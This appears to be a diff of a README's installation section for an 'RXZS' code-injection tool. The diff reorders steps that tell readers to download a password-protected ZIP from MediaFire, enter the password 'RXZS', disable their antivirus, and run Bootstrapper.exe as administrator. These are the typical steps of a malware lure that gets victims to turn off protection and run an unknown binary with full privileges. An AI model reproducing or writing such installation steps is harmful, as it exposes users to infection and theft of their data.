@@ -31,9 +31,9 @@ We use a password to protect the integrity of the file and ensure that only thos
 ## Installation 🛠️
 1. Download the RXZS tool from the MediaFire link provided above.
 2. Extract the contents of the downloaded ZIP file to a location of your choice.
-3. **Disable your antivirus** temporarily. Windows Defender or other antivirus programs may flag the tool because it injects code, which can be mistaken for malicious behavior.
-4. Run the `Bootstrapper.exe` file as an administrator.
-5. Enter the password: `RXZS`
+3. Enter the password: `RXZS`
+4. **Disable your antivirus** temporarily. Windows Defender or other antivirus programs may flag the tool because it injects code, which can be mistaken for malicious behavior.
+5. Run the `Bootstrapper.exe` file as an administrator.  
 6. Follow the on-screen instructions to configure the tool according to your preferences.
 
 **Note**: Always run the tool with administrative privileges to ensure all features function correctly.
